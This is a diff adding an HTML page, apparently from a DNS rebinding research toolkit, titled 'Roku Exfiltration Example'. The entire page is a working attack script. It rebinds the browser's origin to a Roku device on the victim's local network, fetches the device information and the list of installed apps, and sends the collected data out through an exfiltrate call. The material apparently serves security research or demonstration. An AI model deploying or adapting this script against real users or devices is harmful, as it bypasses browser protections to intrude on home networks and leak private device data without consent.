@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roku Exfiltration Example</title>
+</head>
+<body>
+<script type="text/javascript" src="/share/js/xmlToJSON.min.js"></script>
+<script type="text/javascript" src="/share/js/DNSRebindNode.js"></script>
+<script type="text/javascript">
+(function() {
+
+    attack()
+    .then(() => {console.log('attack finished')},
+          err => {
+              console.error(err)
+              DNSRebindNode.emit('fatal', err.message)
+          }
+    )
+    .then(() => DNSRebindNode.destroy())
+
+    async function attack() {
+
+        const getOptions = DNSRebindNode.fetchOptions()
+        getOptions.headers['content-type'] = 'text/xml'
+
+        try {
+            const opts = { fetchOptions: getOptions }
+            await DNSRebindNode.rebind(`http://${location.host}/query/device-info`, opts)
+        } catch (err) {
+            return Promise.reject(err)
+        }
+
+        const exfiltrationData = {}
+
+        try {
+                           
+            await Promise.all([
+                // get basic device info
+                fetch(`http://${location.host}/query/device-info`, getOptions)
+                .then(res => res.text())
+                .then(text => {
+                    const json = xmlToJSON.parseString(text)
+                    exfiltrationData['device-info'] = json['device-info'][0]
+                }),
+
+                // get basic device info
+                fetch(`http://${location.host}/query/apps`, getOptions)
+                .then(res => res.text())
+                .then(text => {
+                    console.log(text)
+                    const json = xmlToJSON.parseString(text)
+                    exfiltrationData['apps'] = json['apps'][0]['app']
+                })
+            ])
+        } catch (err) {
+            return Promise.reject(err)
+        }
+
+        console.log(exfiltrationData)
+        
+        return await DNSRebindNode.exfiltrate('roku-info', exfiltrationData)
+    }
+    
+})()
+</script>
+</body>
+</html>
